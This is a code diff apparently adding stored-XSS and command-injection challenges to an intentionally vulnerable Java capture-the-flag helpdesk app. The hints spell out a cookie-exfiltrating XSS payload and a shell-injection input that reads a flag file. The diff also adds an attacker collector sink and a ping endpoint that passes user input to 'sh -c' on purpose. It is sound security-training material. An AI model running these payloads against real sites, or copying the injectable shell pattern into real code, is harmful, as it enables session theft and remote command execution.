@@ -89,10 +89,27 @@ public class Main {
                     "The server can reach things you can't (cloud metadata).",
                     "avatar URL = http://127.0.0.1:7000/internal/metadata"),
             "FLAG{ssrf_internal_metadata_access}",
-            "Allow-list outbound hosts; block loopback/link-local; use a fetch broker.")
+            "Allow-list outbound hosts; block loopback/link-local; use a fetch broker."),
+        new Challenge("xss_stored", "A05", "medium", "Steal the admin's cookie",
+            "Store a comment that exfiltrates the admin's cookie to your collector.",
+            List.of("Comments render unescaped; an admin bot views new comments every 2s.",
+                    "A pop-up proves nothing - you must exfiltrate document.cookie.",
+                    "<img src=x onerror=\"new Image().src='http://localhost:7000/collector?c='+document.cookie\">,"
+                        + " then read /collector/log."),
+            "FLAG{stored_xss_admin_session_theft}",
+            "Context-aware output encoding on render; strict CSP; HttpOnly cookies."),
+        new Challenge("cmdi", "A05", "hard", "Command injection",
+            "Run an OS command via the admin diagnostics tool.",
+            List.of("Admin diagnostics pings a host you supply (needs admin).",
+                    "The host goes into a shell unquoted.",
+                    "host = 127.0.0.1; cat " + "/tmp/ctf_root.txt"),
+            "FLAG{os_command_injection_rce}",
+            "No shell; pass an argument vector (ProcessBuilder list); allow-list the input.")
     );
 
     static final String XXE_SECRET_FILE = "/tmp/xxe_secret.txt";
+    static final String CMDI_FLAG_FILE = "/tmp/ctf_root.txt";
+    static final String ADMIN_COOKIE = "FLAG{stored_xss_admin_session_theft}";   // the loot the XSS must steal
 
     static final List<String> CRACK_WORDLIST = List.of("password", "123456", "password123", "letmein",
         "qwerty", "admin", "secret", "hunter2", "welcome", "dragon");
@@ -167,6 +184,8 @@ public class Main {
             "CREATE TABLE tickets (id INTEGER PRIMARY KEY, owner TEXT, title TEXT, body TEXT)",
             "CREATE TABLE comments (id INTEGER PRIMARY KEY, ticket_id INT, author TEXT, body TEXT, seen INT DEFAULT 0)",
             "CREATE TABLE solved (cid TEXT PRIMARY KEY, ts REAL)",
+            "DROP TABLE IF EXISTS collector",
+            "CREATE TABLE collector (id INTEGER PRIMARY KEY, ts REAL, data TEXT)",
             "INSERT INTO users(name,password,role) VALUES "
               + "('admin','S3cr3t-R00t-P@ss','admin'),('alice','alicepw','user'),('bob','bobpw','user')",
             "INSERT INTO tickets(owner,title,body) VALUES "
@@ -179,8 +198,45 @@ public class Main {
         }
         try {
             java.nio.file.Files.writeString(java.nio.file.Path.of(XXE_SECRET_FILE), "FLAG{xxe_file_disclosure}\n");
+            java.nio.file.Files.writeString(java.nio.file.Path.of(CMDI_FLAG_FILE), "FLAG{os_command_injection_rce}\n");
         } catch (java.io.IOException e) {
-            throw new IllegalStateException("cannot write " + XXE_SECRET_FILE, e);
+            throw new IllegalStateException("cannot write loot files", e);
+        }
+    }
+
+    // ----------------------------------------------------------------------- //
+    // Admin review bot: stored XSS must EXFILTRATE the admin cookie (not just alert)
+    // ----------------------------------------------------------------------- //
+    static final java.util.regex.Pattern URL_RE = java.util.regex.Pattern.compile("https?://[^\\s'\"<>()]+");
+
+    static void adminBot() {
+        List<String> sinks = List.of("<script", "onerror", "onload", "<svg", "<img");
+        var http = java.net.http.HttpClient.newBuilder().connectTimeout(java.time.Duration.ofSeconds(3)).build();
+        while (true) {
+            try {
+                for (var row : query("SELECT * FROM comments WHERE seen=0")) {
+                    String body = row.get("body") == null ? "" : row.get("body").toString();
+                    String low = body.toLowerCase(Locale.ROOT);
+                    boolean fired = sinks.stream().anyMatch(low::contains);
+                    boolean exfil = low.contains("document.cookie");
+                    var m = URL_RE.matcher(body);
+                    if (fired && exfil && m.find()) {
+                        // the admin's browser "runs" the payload: the cookie leaves to the URL.
+                        String target = m.group().split("\\?")[0].replaceAll("[+'\" )]+$", "");
+                        try {
+                            http.send(java.net.http.HttpRequest.newBuilder(java.net.URI.create(target + "?c="
+                                    + java.net.URLEncoder.encode(ADMIN_COOKIE, java.nio.charset.StandardCharsets.UTF_8)))
+                                    .timeout(java.time.Duration.ofSeconds(3)).build(),
+                                java.net.http.HttpResponse.BodyHandlers.discarding());
+                        } catch (Exception ignored) { }
+                        solve("xss_stored");
+                    }
+                    exec("UPDATE comments SET seen=1 WHERE id=?", row.get("id"));
+                }
+            } catch (Exception e) {
+                System.err.println("admin bot: " + e.getMessage());
+            }
+            try { Thread.sleep(2000); } catch (InterruptedException e) { return; }
         }
     }
 
@@ -322,7 +378,7 @@ public class Main {
     static String layout(Map<String, Object> user, String body) {
         StringBuilder nav = new StringBuilder("<nav><span class=brand>&#128737; Helpdesk</span>"
             + "<a href=\"/\">Home</a><a href=\"/tickets\">Tickets</a><a href=\"/storage\">Storage</a>"
-            + "<a href=\"/scoreboard\">Scoreboard</a>");
+            + "<a href=\"/collector/log\">Collector</a><a href=\"/scoreboard\">Scoreboard</a>");
         if (user != null) {
             if ("admin".equals(user.get("role"))) nav.append("<a href=\"/admin\">Admin</a>");
             nav.append("<span class=\"sp u\">").append(h(user.get("name"))).append(" &middot; ")
@@ -684,7 +740,40 @@ public class Main {
                 solve("forced_admin");
             }
             page(ctx, "<div class=card><h2>Admin panel</h2>"
-                + "<p class=muted>Admin-only area. (Solving is detected server-side; see the scoreboard.)</p></div>");
+                + "<p class=muted>Admin-only area. (Solving is detected server-side; see the scoreboard.)</p>"
+                + "<h3>Network diagnostics</h3>"
+                + "<form action=/admin/ping class=grid><input name=host value=127.0.0.1>"
+                + "<div><button>Ping</button></div></form></div>");
+        });
+
+        app.get("/admin/ping", ctx -> {
+            if (requireUser(ctx) == null) return;
+            String host = ctx.queryParam("host") == null ? "127.0.0.1" : ctx.queryParam("host");
+            // VULN (A05): user input in a shell command string.
+            Process proc = new ProcessBuilder("sh", "-c", "ping -c1 " + host).redirectErrorStream(true).start();
+            String combined;
+            try (var in = proc.getInputStream()) {
+                combined = new String(in.readAllBytes(), java.nio.charset.StandardCharsets.UTF_8);
+            }
+            proc.waitFor();
+            if (combined.contains("FLAG{os_command_injection_rce}")) solve("cmdi");
+            page(ctx, "<div class=card><h2>Diagnostics</h2><pre>" + h(combined) + "</pre></div>");
+        });
+
+        // ---- attacker collector (XSS exfil sink) --------------------------- //
+        app.get("/collector", ctx -> {
+            String c = param(ctx.queryParam("c"));
+            if (!c.isEmpty()) exec("INSERT INTO collector(ts,data) VALUES(?,?)", now(), c);
+            ctx.contentType("image/gif").result("");
+        });
+
+        app.get("/collector/log", ctx -> {
+            StringBuilder pre = new StringBuilder();
+            for (var r : query("SELECT ts,data FROM collector ORDER BY id DESC"))
+                pre.append("<pre>").append(h(r.get("data"))).append("</pre>");
+            page(ctx, "<div class=card><h2>Collector &mdash; received data</h2>"
+                + "<p class=muted>Your exfiltration sink. Point XSS payloads here.</p>"
+                + (pre.length() == 0 ? "<p>nothing yet</p>" : pre) + "</div>");
         });
 
         // ---- scoreboard ---------------------------------------------------- //
@@ -713,5 +802,8 @@ public class Main {
         });
 
         app.start("0.0.0.0", 7000);
+        Thread bot = new Thread(Main::adminBot, "admin-bot");
+        bot.setDaemon(true);
+        bot.start();
     }
 }
